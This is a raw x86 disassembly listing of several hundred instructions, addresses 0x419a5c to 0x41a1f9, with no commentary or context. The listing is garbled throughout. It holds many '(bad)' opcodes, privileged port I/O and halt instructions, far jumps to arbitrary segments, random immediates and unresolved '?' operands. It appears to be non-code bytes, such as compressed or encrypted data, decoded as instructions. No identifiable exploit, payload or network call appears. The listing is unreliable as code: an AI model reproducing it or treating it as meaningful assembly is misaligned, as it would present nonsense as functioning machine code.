  419a5c:	ss jo  0x419abc
  419a5f:	push   esp
  419a60:	jmp    0x579b:0x833160b8
  419a67:	sbb    ah,dh
  419a69:	xchg   esp,eax
  419a6a:	call   FWORD PTR [eax-0x3765b63a]
  419a70:	(bad)  
  419a71:	xchg   ebx,eax
  419a72:	rcl    edi,cl
  419a74:	pop    ds
  419a75:	mov    al,0x21
  419a77:	mov    eax,0xc8aa9fde
  419a7c:	inc    esi
  419a7d:	pop    ebx
  419a7e:	xchg   ecx,ebx
  419a80:	or     DWORD PTR [ecx+0x16],ecx
  419a83:	mov    edi,0xc72640b4
  419a88:	aad    0xe5
  419a8a:	fucomp st(1)
  419a8c:	icebp  
  419a8d:	stos   DWORD PTR es:[edi],eax
  419a8e:	cmp    al,0xd7
  419a90:	add    al,0x58
  419a92:	std    
  419a93:	mov    ebx,0x4810809
  419a98:	out    dx,al
  419a99:	mov    ebx,cs
  419a9b:	rcr    DWORD PTR ds:0xea34dbef,cl
  419aa1:	ss mov ch,0x20
  419aa4:	imul   ebp,DWORD PTR [edi+0x7d],0x2c
  419aa8:	jmp    0x419aab
  419aaa:	jmp    0x419b08
  419aac:	lea    esi,[ebp-0x20e0b8a2]
  419ab2:	inc    eax
  419ab3:	sub    DWORD PTR [ebx+eiz*2+0x2e],eax
  419ab7:	loopne 0x419a9f
  419ab9:	or     ebp,edi
  419abb:	pmovmskb ecx,mm2
  419abe:	repnz test eax,0xc4b1e9ae
  419ac4:	mov    fs,WORD PTR [edi]
  419ac6:	inc    eax
  419ac7:	shr    BYTE PTR [esi+0x1f],1
  419aca:	mov    dh,0x1d
  419acc:	push   ds
  419acd:	ins    BYTE PTR es:[edi],dx
  419ace:	std    
  419acf:	addr16 retf 
  419ad1:	xchg   edi,eax
  419ad2:	jne    0x419aff
  419ad4:	mov    ecx,0xe8c849b5
  419ad9:	mov    esi,0x84ce56a7
  419ade:	cmp    DWORD PTR [eax],edx
  419ae0:	jmp    0x419ac6
  419ae2:	into   
  419ae3:	dec    edx
  419ae4:	sub    edx,edi
  419ae6:	xor    DWORD PTR [edx+ebx*8-0x32],ecx
  419aea:	(bad)  
  419aeb:	(bad)  
  419aec:	ss gs retf 
  419aef:	cmp    al,BYTE PTR [ebp+0x4f]
  419af2:	sub    ebp,DWORD PTR [edx+0x47fd8bf7]
  419af8:	push   esi
  419af9:	outs   dx,DWORD PTR ds:[esi]
  419afa:	icebp  
  419afb:	out    dx,eax
  419afc:	jbe    0x419b52
  419afe:	je     0x419ac8
  419b00:	mov    al,ds:0x9444b93c
  419b05:	inc    ecx
  419b06:	and    al,0x91
  419b08:	and    DWORD PTR [ecx-0x3],esi
  419b0b:	out    0xa8,eax
  419b0d:	in     al,dx
  419b0e:	stc    
  419b0f:	ror    DWORD PTR [eax+0x7dcb7c86],0x62
  419b16:	ret    
  419b17:	nop
  419b18:	mov    cl,0x54
  419b1a:	jge    0x419b47
  419b1c:	(bad)  
  419b1d:	ins    DWORD PTR es:[edi],dx
  419b1e:	daa    
  419b1f:	add    al,0xeb
  419b21:	out    0xf1,al
  419b23:	jecxz  0x419af8
  419b25:	pusha  
  419b26:	cmp    eax,0x18df6ef4
  419b2b:	and    eax,0xff0110f6
  419b30:	sub    al,0x73
  419b32:	std    
  419b33:	ret    0xb9fc
  419b36:	loop   0x419abd
  419b38:	ret    0x9951
  419b3b:	enter  0xd4fb,0xc6
  419b3f:	adc    DWORD PTR [ebx],esp
  419b41:	sub    DWORD PTR [ebx+0x19aceb07],esi
  419b47:	stos   BYTE PTR es:[edi],al
  419b48:	mov    ds:0xc9c66ea5,eax
  419b4d:	fild   WORD PTR [ebp+edx*4-0x64dc3ba3]
  419b54:	mov    al,0xae
  419b56:	sahf   
  419b57:	jae    0x419b44
  419b59:	inc    eax
  419b5a:	jmp    0x5445:0x8fa4ba6
  419b61:	fild   QWORD PTR [eax+0x5]
  419b64:	mov    ebx,0x47f10272
  419b69:	xchg   ecx,eax
  419b6a:	std    
  419b6b:	lods   eax,DWORD PTR ds:[esi]
  419b6c:	dec    edx
  419b6d:	jp     0x419b0a
  419b6f:	xchg   esi,eax
  419b70:	cmp    ebp,DWORD PTR [esi]
  419b72:	and    eax,ecx
  419b74:	bnd jbe 0x419b16
  419b77:	lds    edi,FWORD PTR [eax]
  419b79:	or     DWORD PTR [ecx+0x39],0x765cf14
  419b80:	in     eax,dx
  419b81:	pop    es
  419b82:	dec    edi
  419b83:	add    DWORD PTR [eax],0xffffffc0
  419b86:	xor    DWORD PTR [ebx-0x56],edx
  419b89:	xchg   esi,eax
  419b8a:	loopne 0x419b53
  419b8c:	loop   0x419bfd
  419b8e:	xchg   esp,eax
  419b8f:	pop    edi
  419b90:	pop    eax
  419b91:	les    edi,FWORD PTR [ebx-0x72]
  419b94:	mov    edi,0x2cc89334
  419b99:	leave  
  419b9a:	mov    bh,0x81
  419b9c:	(bad)  
  419b9d:	xchg   esi,eax
  419b9e:	retf   0x83c8
  419ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ba2:	pop    esi
  419ba3:	pop    ebx
  419ba4:	lds    esp,FWORD PTR [esp+esi*1+0x1f]
  419ba8:	jmp    0xe6f9:0xd1c77241
  419baf:	outs   dx,DWORD PTR ds:[esi]
  419bb0:	mov    ecx,0xc3c7eb03
  419bb5:	sbb    bl,BYTE PTR ds:0xa3fcc9a6
  419bbb:	inc    edx
  419bbc:	jmp    0x419b55
  419bbe:	ja     0x419b5d
  419bc0:	mov    ds:0x82e13c3e,eax
  419bc5:	dec    ebp
  419bc6:	mov    bl,0xc8
  419bc8:	(bad)
  419bcc:	jl     0x419b93
  419bce:	scas   al,BYTE PTR es:[edi]
  419bcf:	(bad)  
  419bd0:	(bad)  
  419bd1:	dec    edi
  419bd2:	loopne 0x419baf
  419bd4:	in     eax,0xe6
  419bd6:	sbb    eax,0x13df65a4
  419bdb:	mov    esi,0x7576af07
  419be0:	test   BYTE PTR [ebp-0x4],ch
  419be3:	sub    eax,0xf2d3629d
  419be8:	sbb    dh,BYTE PTR [edi]
  419bea:	out    0x17,eax
  419bec:	repnz sub al,0x29
  419bef:	retf   
  419bf0:	push   0xfffffffd
  419bf2:	mov    ds:0xcd25801b,eax
  419bf7:	and    cl,BYTE PTR [edi+0x57]
  419bfa:	std    
  419bfb:	jmp    0xe016:0x11067146
  419c02:	in     al,0xc7
  419c04:	xor    DWORD PTR [esi+ecx*1],edi
  419c07:	mov    bl,0xe5
  419c09:	push   0x10
  419c0b:	leave  
  419c0c:	jmp    0x419b90
  419c0e:	in     al,dx
  419c0f:	or     al,bl
  419c11:	jg     0x419b9f
  419c13:	mov    DWORD PTR [ecx-0x44024820],esi
  419c19:	cmp    DWORD PTR [edi],eax
  419c1b:	cwde   
  419c1c:	push   ebp
  419c1d:	push   ebx
  419c1e:	sub    DWORD PTR ds:0xe7185deb,0xffffffa1
  419c25:	xchg   edx,eax
  419c26:	jbe    0x419c8a
  419c28:	mov    ch,0xdc
  419c2a:	jnp    0x419bb8
  419c2c:	mov    ds:0x7013e284,eax
  419c32:	jmp    0x419c3a
  419c34:	jmp    0x7e59:0x794d7426
  419c3b:	pop    eax
  419c3c:	pop    es
  419c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c3e:	bswap  eax
  419c40:	cmc    
  419c41:	mov    dl,0x9b
  419c43:	shl    DWORD PTR [edi],1
  419c45:	cmp    DWORD PTR [esi-0x80],edx
  419c48:	jmp    0x419c9a
  419c4a:	sub    al,BYTE PTR [ebx]
  419c4c:	out    dx,eax
  419c4d:	add    eax,0xde5f216d
  419c52:	inc    edx
  419c53:	or     BYTE PTR [ecx-0x1c2b83e6],dh
  419c59:	cmp    DWORD PTR [eax+ecx*8+0x7509032b],ebp
  419c60:	dec    eax
  419c61:	fild   QWORD PTR [esi+0x30]
  419c64:	pop    esp
  419c65:	imul   esp,DWORD PTR [edi],0xffffffe1
  419c68:	push   edi
  419c69:	enter  0x3664,0xeb
  419c6d:	je     0x419bf6
  419c6f:	push   0x5f
  419c71:	scas   eax,DWORD PTR es:[edi]
  419c72:	idiv   BYTE PTR [edx-0x4c]
  419c75:	push   es
  419c76:	test   BYTE PTR [eax+0x273556eb],bh
  419c7c:	int3   
  419c7d:	ins    BYTE PTR es:[edi],dx
  419c7e:	es loope 0x419c6b
  419c81:	repz (bad) 
  419c83:	cmp    eax,0x307d30f9
  419c88:	(bad)  
  419c89:	in     al,0xea
  419c8b:	ret    
  419c8c:	pop    esp
  419c8d:	or     BYTE PTR [esp+edi*1+0x70],bl
  419c91:	pop    edi
  419c92:	adc    BYTE PTR [esi+0x1f01f8af],0xca
  419c99:	cmp    eax,0x68206e3d
  419c9e:	mov    al,ds:0xd0dfe895
  419ca3:	lock ins DWORD PTR es:[edi],dx
  419ca5:	inc    ebx
  419ca6:	pop    esi
  419ca7:	inc    ecx
  419ca8:	xchg   BYTE PTR ds:0xec7d9f0c,cl
  419cae:	cld    
  419caf:	inc    eax
  419cb0:	rcl    BYTE PTR ds:0xdf8a32ee,0x90
  419cb7:	jae    0x419cdf
  419cb9:	in     al,0xf4
  419cbb:	(bad)  
  419cbc:	sub    ebp,DWORD PTR [esi]
  419cbe:	std    
  419cbf:	and    dh,bh
  419cc1:	lahf   
  419cc2:	or     eax,0xde9287ef
  419cc7:	(bad)  
  419cc8:	mov    ebp,0x5b6ee237
  419ccd:	pop    ds
  419cce:	mov    ebp,0xfd0f812f
  419cd3:	js     0x419cef
  419cd5:	add    BYTE PTR [ebp+edx*1+0x32],ah
  419cd9:	test   eax,0x1ee7c870
  419cde:	adc    eax,0xa30ef316
  419ce3:	push   0xffffffed
  419ce5:	xchg   edx,eax
  419ce6:	mov    ecx,0x77f4330
  419ceb:	cmc    
  419cec:	jge    0x419d13
  419cee:	mov    esp,DWORD PTR [edx]
  419cf0:	lods   eax,DWORD PTR ds:[esi]
  419cf1:	(bad)  
  419cf3:	push   esi
  419cf4:	push   esp
  419cf5:	stos   BYTE PTR es:[edi],al
  419cf6:	add    ch,BYTE PTR [edi-0x8034d26]
  419cfc:	test   DWORD PTR [edi-0x3a],edx
  419cff:	in     al,0x5c
  419d01:	jmp    0x419d81
  419d03:	enter  0x2dcb,0xae
  419d07:	mov    gs,ecx
  419d09:	add    eax,0xb2eb19ee
  419d0e:	push   ds
  419d0f:	jp     0x419d3f
  419d11:	mov    eax,0xdfc8301d
  419d16:	push   eax
  419d17:	and    ecx,edx
  419d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d1a:	mov    eax,ds:0xfd3de99b
  419d1f:	ficomp DWORD PTR [edi+0x5e987448]
  419d25:	jl     0x419d92
  419d27:	enter  0x84cd,0x36
  419d2b:	mov    dl,0xca
  419d2d:	leave  
  419d2e:	cmp    dl,BYTE PTR [ebx+ebp*8-0x2f]
  419d32:	fmulp  st(3),st
  419d34:	in     al,0xeb
  419d36:	xor    edx,DWORD PTR ds:0x9976df08
  419d3c:	sub    eax,0x335ae23c
  419d41:	cmp    ebp,edi
  419d43:	stc    
  419d44:	dec    ecx
  419d45:	test   DWORD PTR [ecx],0x343e7e11
  419d4b:	enter  0x677b,0x64
  419d4f:	mov    ebx,0xc781be53
  419d54:	jmp    0x762a:0x39db478d
  419d5b:	clc    
  419d5c:	pusha  
  419d5d:	sbb    eax,0xe55cc845
  419d62:	ret    0x833f
  419d65:	mov    eax,0xc6eb62bc
  419d6a:	out    0x23,eax
  419d6c:	add    BYTE PTR [esi],0x7a
  419d6f:	sbb    al,0x38
  419d71:	fild   WORD PTR [ebx+ebp*4+0x23]
  419d75:	sbb    DWORD PTR [eax-0x2ca59fce],edi
  419d7b:	cmc    
  419d7c:	push   es
  419d7d:	xor    edi,ebp
  419d7f:	sbb    BYTE PTR [eax],ch
  419d81:	lods   al,BYTE PTR ds:[esi]
  419d82:	inc    eax
  419d83:	jmp    0x419dd4
  419d85:	fcomp  DWORD PTR [ecx+0x3d855ea3]
  419d8b:	cli    
  419d8c:	push   edx
  419d8d:	xor    esp,DWORD PTR [eax-0x1756440]
  419d93:	scas   al,BYTE PTR es:[edi]
  419d94:	and    dl,BYTE PTR [eax+0x5f]
  419d97:	loopne 0x419d4d
  419d99:	loop   0x419d67
  419d9b:	dec    ecx
  419d9c:	test   BYTE PTR [edx],0xf0
  419d9f:	lds    ebp,FWORD PTR [ebx+0x19]
  419da2:	lahf   
  419da3:	fstp   DWORD PTR [esi]
  419da5:	nop
  419da6:	stc    
  419da7:	xchg   ecx,eax
  419da8:	jmp    0x419df5
  419daa:	jo     0x419d38
  419dac:	arpl   WORD PTR [ebx],cx
  419dae:	mov    esp,0x1cdfd691
  419db3:	xchg   BYTE PTR ds:0x3d76bfa9,bl
  419db9:	outs   dx,DWORD PTR ds:[esi]
  419dba:	mov    ds:0xe1fdf20a,eax
  419dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc0:	scas   eax,DWORD PTR es:[edi]
  419dc1:	pop    ecx
  419dc2:	stos   DWORD PTR es:[edi],eax
  419dc3:	dec    ebx
  419dc4:	shl    DWORD PTR [ebx+ecx*4+0x61],cl
  419dc8:	push   ebp
  419dc9:	xlat   BYTE PTR ds:[ebx]
  419dca:	sub    al,0x7c
  419dcc:	neg    bh
  419dce:	mov    eax,0xe2933d61
  419dd3:	push   ss
  419dd4:	(bad)  [edi-0x71707504]
  419dda:	imul   ebx,DWORD PTR [eax+0x67],0x65
  419dde:	fist   WORD PTR cs:[ebp+ebx*8-0x4]
  419de3:	mov    ebp,0x4a9df54b
  419de8:	in     eax,dx
  419de9:	sub    al,0x4
  419deb:	jo     0x419dad
  419ded:	or     al,0x34
  419def:	int3   
  419df0:	mov    ecx,0x8b852940
  419df5:	mov    ?,WORD PTR [esp+esi*8]
  419df8:	adc    al,0xde
  419dfa:	dec    esp
  419dfb:	lods   eax,DWORD PTR ds:[esi]
  419dfc:	adc    DWORD PTR [ecx+0x4],eax
  419dff:	pop    esp
  419e00:	sub    DWORD PTR [eax+0x226ab9bc],edi
  419e06:	jl     0x419e45
  419e08:	jmp    0x419e41
  419e0a:	or     DWORD PTR [eax-0x102d3e2],eax
  419e10:	mov    bh,0xf2
  419e12:	push   cs
  419e13:	adc    cl,bl
  419e15:	scas   al,BYTE PTR es:[edi]
  419e16:	mov    bl,0xc8
  419e18:	cmp    al,0x72
  419e1a:	enter  0x9aef,0x3a
  419e1e:	ins    BYTE PTR es:[edi],dx
  419e1f:	inc    ebp
  419e20:	adc    DWORD PTR [ecx+0x3],ecx
  419e23:	ins    BYTE PTR es:[edi],dx
  419e24:	xor    bl,ch
  419e26:	cmp    al,0xf2
  419e28:	call   DWORD PTR [ebp+0x34095531]
  419e2e:	popf   
  419e2f:	test   al,0xa6
  419e31:	fistp  QWORD PTR [edx+0x40]
  419e34:	(bad)
  419e37:	stos   BYTE PTR es:[edi],al
  419e38:	mov    ds:0xd5f50046,al
  419e3d:	mov    ebx,0x879159b2
  419e42:	mov    bh,BYTE PTR [ecx+0x6322e076]
  419e48:	dec    ebx
  419e49:	ficom  WORD PTR [esi+0x58]
  419e4c:	repnz scas al,BYTE PTR es:[edi]
  419e4e:	mov    bh,BYTE PTR [ecx]
  419e50:	arpl   WORD PTR [edi-0x31d06504],dx
  419e56:	je     0x419e79
  419e58:	cmc    
  419e59:	inc    edx
  419e5a:	xchg   edx,eax
  419e5b:	in     al,0x52
  419e5d:	sub    eax,0x771ec888
  419e62:	ja     0x419dfa
  419e64:	push   0xffffffc8
  419e66:	cld    
  419e67:	mov    dl,0x55
  419e69:	push   cs
  419e6a:	sub    dl,bl
  419e6c:	pop    esp
  419e6d:	fcmove st,st(6)
  419e6f:	(bad)  
  419e70:	dec    edx
  419e71:	push   edx
  419e72:	mov    dh,0xd6
  419e74:	(bad)  
  419e75:	lahf   
  419e76:	push   cs
  419e77:	cmp    eax,0x202cc28
  419e7c:	ret    0xc349
  419e7f:	inc    ecx
  419e80:	(bad)  
  419e81:	imul   edi,DWORD PTR ds:0x57d1b639,0x76
  419e88:	cmp    bl,cl
  419e8a:	jmp    0x419e28
  419e8c:	push   ebx
  419e8d:	in     al,0xbc
  419e8f:	jmp    0xbc2a55fa
  419e94:	call   ebp
  419e96:	mov    esp,gs
  419e98:	jmp    0x419e74
  419e9a:	adc    bh,BYTE PTR [ebp-0x3797d3d6]
  419ea0:	xchg   esp,eax
  419ea1:	fnsave [ebp-0x519ac8f]
  419ea7:	cdq    
  419ea8:	out    dx,eax
  419ea9:	sbb    al,BYTE PTR [edi]
  419eab:	mov    eax,ds:0xcae427ed
  419eb0:	lahf   
  419eb1:	push   esi
  419eb2:	gs (bad) 
  419eb4:	mov    eax,DWORD PTR [ecx*8-0x2a10854]
  419ebb:	jle    0x419f30
  419ebd:	repnz scas al,BYTE PTR es:[edi]
  419ebf:	mov    ds:0xce0c1947,al
  419ec4:	inc    ebp
  419ec5:	push   esp
  419ec6:	fmulp  st(1),st
  419ec8:	dec    ebx
  419ec9:	pushf  
  419eca:	cmp    BYTE PTR [edi+0x45fcac01],ch
  419ed0:	mov    ebx,0xc159165c
  419ed5:	sbb    BYTE PTR [eax+ecx*8+0x3438599a],dl
  419edc:	popa   
  419edd:	jns    0x419e80
  419edf:	push   esp
  419ee0:	jmp    0x419ee5
  419ee2:	stos   DWORD PTR es:[edi],eax
  419ee3:	or     al,0xd7
  419ee5:	jmp    0xe026b46e
  419eea:	out    dx,al
  419eeb:	inc    ebp
  419eec:	mov    ah,0xe7
  419eee:	mov    ecx,?
  419ef0:	mov    cl,0xd3
  419ef2:	cld    
  419ef3:	jle    0x419f38
  419ef5:	mov    ah,0x40
  419ef7:	mov    al,0x75
  419ef9:	inc    ebx
  419efa:	add    eax,ecx
  419efc:	xchg   esp,eax
  419efd:	and    BYTE PTR [edi+ebx*4-0x67],0xbe
  419f02:	mov    al,ds:0x838feb4d
  419f07:	adc    DWORD PTR [eax-0x13],0x97595ae
  419f0e:	clc    
  419f0f:	cwde   
  419f10:	jmp    0x6d82:0x3e5695cb
  419f17:	icebp  
  419f18:	pop    edi
  419f19:	in     eax,0xa6
  419f1b:	pop    ds
  419f1c:	hlt    
  419f1d:	push   es
  419f1e:	es inc ecx
  419f20:	bound  ecx,QWORD PTR [edx-0x3]
  419f23:	test   DWORD PTR ds:0x807f4,ebp
  419f29:	cmp    BYTE PTR [ebp-0x60],dh
  419f2c:	stos   DWORD PTR es:[edi],eax
  419f2d:	or     BYTE PTR [edx],ah
  419f2f:	add    cl,BYTE PTR [ebp-0x943fd4e]
  419f35:	popa   
  419f36:	add    DWORD PTR [eax+0x76],ecx
  419f39:	mov    ch,0x53
  419f3b:	cmp    BYTE PTR [edx+0x18],0xfd
  419f3f:	rcl    DWORD PTR [ebp+0x59],cl
  419f42:	call   0xeb13873e
  419f47:	(bad)  
  419f48:	jg     0x419f80
  419f4a:	call   FWORD PTR [esi]
  419f4c:	pop    eax
  419f4d:	push   0x41ebae9f
  419f52:	loopne 0x419fb4
  419f54:	inc    edi
  419f55:	pop    ebp
  419f56:	mov    edi,esp
  419f58:	fcomip st,st(3)
  419f5b:	inc    eax
  419f5c:	sub    al,0xe7
  419f5e:	leave  
  419f5f:	test   eax,0x83fc9612
  419f64:	(bad)  
  419f65:	inc    ecx
  419f66:	mov    eax,0x9dd5f6a6
  419f6b:	loop   0x419fcb
  419f6d:	push   es
  419f6e:	push   0x4a51ebad
  419f73:	and    bl,BYTE PTR [eax-0x27]
  419f76:	pop    es
  419f77:	pop    esp
  419f78:	or     esi,DWORD PTR [edi*8+0x2ac06cdf]
  419f7f:	sbb    ah,BYTE PTR es:[ebx-0x78]
  419f83:	enter  0xd297,0xf5
  419f87:	lds    eax,FWORD PTR [ebx-0x3a095a06]
  419f8d:	jnp    0x419f4a
  419f8f:	adc    ebx,ebp
  419f91:	jae    0x419f1a
  419f93:	adc    BYTE PTR [eax+0x7fc8a584],bh
  419f99:	pop    ebx
  419f9a:	add    ch,BYTE PTR [ecx]
  419f9c:	sbb    edi,edx
  419f9e:	dec    esp
  419f9f:	xor    ebp,ecx
  419fa1:	es rcl ch,cl
  419fa4:	in     al,dx
  419fa5:	xchg   ebx,eax
  419fa6:	xlat   BYTE PTR ds:[ebx]
  419fa7:	sub    BYTE PTR [ebp+0x5f00bd01],dh
  419fad:	fnstsw WORD PTR [eax+0x3e]
  419fb0:	xor    bl,BYTE PTR [edi+0x3aab985a]
  419fb6:	mov    ecx,0x34f2dd3d
  419fbb:	inc    edi
  419fbc:	xor    DWORD PTR [ebp+eax*8-0x4c2d040e],ebp
  419fc3:	call   0x3fc880a8
  419fc8:	das    
  419fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fca:	mov    esp,0xad0ecec9
  419fcf:	cwde   
  419fd0:	mov    eax,ebx
  419fd2:	std    
  419fd3:	inc    ebp
  419fd4:	int    0xd4
  419fd6:	cmp    esp,DWORD PTR [ecx-0x3d]
  419fd9:	inc    ebp
  419fda:	cmp    eax,0xde6813e
  419fdf:	enter  0x15aa,0x15
  419fe3:	adc    al,0x19
  419fe5:	cld    
  419fe6:	xchg   ebx,eax
  419fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe8:	out    0xcf,al
  419fea:	and    ebx,DWORD PTR ds:0xcb3d8bb6
  419ff0:	xchg   esp,eax
  419ff1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419ff3:	jns    0x419fad
  419ff5:	and    eax,ecx
  419ff7:	ret    0xdf43
  419ffa:	rcr    BYTE PTR [edx+0x24],1
  419ffd:	pop    edi
  419ffe:	mov    ebp,0xaaa62d40
  41a003:	loopne 0x419ff2
  41a005:	cmp    al,0x2c
  41a007:	popf   
  41a008:	das    
  41a009:	lahf   
  41a00a:	inc    esi
  41a00b:	xor    edi,ebx
  41a00d:	scas   eax,DWORD PTR es:[edi]
  41a00e:	lods   al,BYTE PTR ds:[esi]
  41a00f:	enter  0xfa41,0x16
  41a013:	dec    ebp
  41a014:	aaa    
  41a015:	adc    BYTE PTR [ecx+edx*1-0x19],al
  41a019:	scas   al,BYTE PTR es:[edi]
  41a01a:	setle  ah
  41a01d:	mov    dh,0x7c
  41a01f:	in     eax,0xc6
  41a021:	(bad)  
  41a022:	push   ds
  41a023:	enter  0xfee1,0xee
  41a027:	test   DWORD PTR [ecx],ebp
  41a029:	cld    
  41a02a:	pusha  
  41a02b:	dec    ebx
  41a02c:	jmp    0x41a07b
  41a02e:	scas   al,BYTE PTR es:[edi]
  41a02f:	adc    al,0x6b
  41a031:	repnz inc eax
  41a033:	stc    
  41a034:	(bad)  
  41a035:	fild   WORD PTR [esi+0x25]
  41a038:	xor    DWORD PTR ds:0x93f2a06e,eax
  41a03e:	test   DWORD PTR [edi+0x550c6beb],esi
  41a044:	aam    0xa1
  41a046:	push   edi
  41a047:	add    eax,0xb435dfe5
  41a04c:	in     al,dx
  41a04d:	xchg   BYTE PTR [ebx+esi*4-0x7972c235],al
  41a054:	jmp    0x41a01b
  41a056:	dec    eax
  41a057:	(bad)  
  41a058:	hlt    
  41a059:	lock mov edi,0xabdf7d0c
  41a05f:	fisubr DWORD PTR [edi+0x3e]
  41a062:	mov    ecx,0xfd5618fe
  41a067:	in     al,dx
  41a068:	lahf   
  41a069:	(bad)  
  41a06a:	jae    0x41a019
  41a06c:	pop    ebp
  41a06d:	dec    edi
  41a06e:	xchg   ecx,eax
  41a06f:	leave  
  41a070:	stc    
  41a071:	mov    ch,0xf0
  41a073:	inc    edi
  41a074:	cwde   
  41a075:	lods   eax,DWORD PTR ds:[esi]
  41a076:	(bad)  
  41a077:	daa    
  41a078:	imul   edi,DWORD PTR [esi-0x59],0xffffffcf
  41a07c:	adc    eax,0x93bbfe3a
  41a081:	test   al,0x38
  41a083:	out    0x46,eax
  41a085:	fst    QWORD PTR [eax+0x35df6f4a]
  41a08b:	push   ss
  41a08c:	loop   0x41a05e
  41a08e:	sbb    eax,edx
  41a090:	fsubr  DWORD PTR [eax]
  41a092:	mul    BYTE PTR [ebx-0x380257e2]
  41a098:	pushf  
  41a099:	inc    ebx
  41a09a:	push   edi
  41a09b:	adc    cl,ch
  41a09d:	or     dl,BYTE PTR [ebp+eax*8+0x5d643d6c]
  41a0a4:	bound  ebx,QWORD PTR [ebx+eiz*8-0x69dd3e04]
  41a0ab:	hlt    
  41a0ac:	or     eax,0xa10dfcf2
  41a0b1:	ins    DWORD PTR es:[edi],dx
  41a0b2:	jle    0x41a064
  41a0b4:	or     al,0x61
  41a0b6:	pop    ecx
  41a0b7:	in     eax,0x68
  41a0b9:	pop    es
  41a0ba:	dec    ebx
  41a0bb:	sub    bl,ch
  41a0bd:	mov    ds:0xff3ebb5f,al
  41a0c2:	adc    eax,ecx
  41a0c4:	push   ecx
  41a0c5:	xlat   BYTE PTR ds:[ebx]
  41a0c6:	xor    al,0x18
  41a0c8:	mov    esi,0xeb3721bf
  41a0cd:	jp     0x41a094
  41a0cf:	xor    BYTE PTR [eax+0x24a5d486],al
  41a0d5:	loop   0x41a134
  41a0d7:	pop    DWORD PTR [edi+0x63]
  41a0da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0db:	or     BYTE PTR [ebx-0x51],ch
  41a0de:	cmp    ecx,DWORD PTR [edx-0x134e310c]
  41a0e4:	(bad)  
  41a0e6:	mov    edi,0xd636b6c3
  41a0eb:	enter  0xbc9,0xb1
  41a0ef:	ins    BYTE PTR es:[edi],dx
  41a0f0:	sahf   
  41a0f1:	pop    esp
  41a0f2:	cwde   
  41a0f3:	push   ss
  41a0f4:	mov    esp,DWORD PTR [ecx+0x69]
  41a0f7:	into   
  41a0f8:	inc    dl
  41a0fa:	addr16 mov al,0xf
  41a0fd:	pop    ebx
  41a0fe:	clc    
  41a0ff:	xchg   ecx,eax
  41a100:	ja     0x41a161
  41a102:	jmp    0xd7e0:0x5d6da785
  41a109:	push   eax
  41a10a:	hlt    
  41a10b:	add    al,0xf5
  41a10d:	test   DWORD PTR [ebp+0x570675bb],ebx
  41a113:	add    ch,bl
  41a115:	inc    edx
  41a116:	cld    
  41a117:	cli    
  41a118:	je     0x41a0dc
  41a11a:	dec    ecx
  41a11b:	jno    0x41a138
  41a11d:	fbstp  TBYTE PTR [ebx+0x7e]
  41a120:	sbb    al,0xec
  41a122:	add    BYTE PTR [edx+eax*1+0x3dc3fcc9],dh
  41a129:	fist   DWORD PTR [eax]
  41a12b:	cli    
  41a12c:	and    BYTE PTR ds:0x9b61cba6,bl
  41a132:	imul   esi,DWORD PTR [esi+0x75553e3],0xcffbee83
  41a13c:	push   edx
  41a13d:	clc    
  41a13e:	adc    eax,0x9ccf1bf7
  41a143:	mov    ds:0x9dfdfa9,al
  41a148:	adc    ecx,DWORD PTR [edi+eax*8]
  41a14b:	adc    ebx,DWORD PTR [edi]
  41a14d:	xor    edi,ebp
  41a14f:	loopne 0x41a1a3
  41a151:	cdq    
  41a152:	sbb    al,0x75
  41a154:	popf   
  41a155:	or     eax,0xe48fcb9a
  41a15a:	cmc    
  41a15b:	pop    ds
  41a15c:	jmp    0x73fe3ee6
  41a161:	mov    BYTE PTR [edx],al
  41a163:	cdq    
  41a164:	pop    ebp
  41a165:	dec    esi
  41a166:	std    
  41a167:	xor    al,0x33
  41a169:	sub    esi,DWORD PTR [edx-0x6c]
  41a16c:	shl    DWORD PTR [edi],cl
  41a16e:	jae    0x41a138
  41a170:	jno    0x41a1b4
  41a172:	adc    al,0x9e
  41a174:	mov    eax,0xeb80be14
  41a179:	add    DWORD PTR [edx-0x70cc806d],edx
  41a17f:	and    al,0x7d
  41a181:	fild   QWORD PTR [esi+0x59]
  41a184:	outs   dx,DWORD PTR ds:[esi]
  41a185:	xor    dl,0xd
  41a188:	pop    ebx
  41a189:	(bad)  
  41a18a:	mov    ds:0x2dd8eb2f,al
  41a18f:	push   ss
  41a190:	lds    esp,FWORD PTR [ecx]
  41a192:	fprem1 
  41a194:	dec    esp
  41a195:	fist   WORD PTR [ebp+0x7424039b]
  41a19b:	fnstcw WORD PTR [esi]
  41a19d:	or     eax,0xe9ec219d
  41a1a2:	xchg   bl,bh
  41a1a4:	mov    bh,0x7b
  41a1a6:	fwait
  41a1a7:	pop    edx
  41a1a8:	sbb    esi,DWORD PTR [eax-0x2c]
  41a1ab:	loope  0x41a208
  41a1ad:	pop    edi
  41a1ae:	std    
  41a1af:	clc    
  41a1b0:	ror    BYTE PTR [ecx-0x50],1
  41a1b3:	rcl    BYTE PTR [esi+0x6a],0x23
  41a1b7:	mov    edx,0x5ae591eb
  41a1bc:	das    
  41a1bd:	lea    edi,[ecx]
  41a1bf:	out    dx,al
  41a1c0:	arpl   WORD PTR [esi+ecx*4],ax
  41a1c3:	je     0x41a1b0
  41a1c5:	dec    edx
  41a1c6:	je     0x41a1c3
  41a1c8:	jnp    0x41a1bb
  41a1ca:	sbb    dh,BYTE PTR [esi+0x1e]
  41a1cd:	aaa    
  41a1ce:	inc    ecx
  41a1cf:	push   eax
  41a1d0:	jmp    0x41a20a
  41a1d2:	(bad)
  41a1d5:	bsf    ebp,DWORD PTR ds:0xf0f7dfc2
  41a1dc:	daa    
  41a1dd:	loopne 0x41a1ca
  41a1df:	fisubr DWORD PTR [edi-0x6b40030b]
  41a1e5:	mov    ah,0x23
  41a1e7:	in     al,dx
  41a1e8:	jle    0x41a245
  41a1ea:	jae    0x41a206
  41a1ec:	push   eax
  41a1ed:	fistp  WORD PTR [edi+0x5a]
  41a1f0:	cmc    
  41a1f1:	imul   edx,DWORD PTR [ebx-0x64],0x66fcbb61
  41a1f8:	ret    
  41a1f9:	xor    al,0x8c
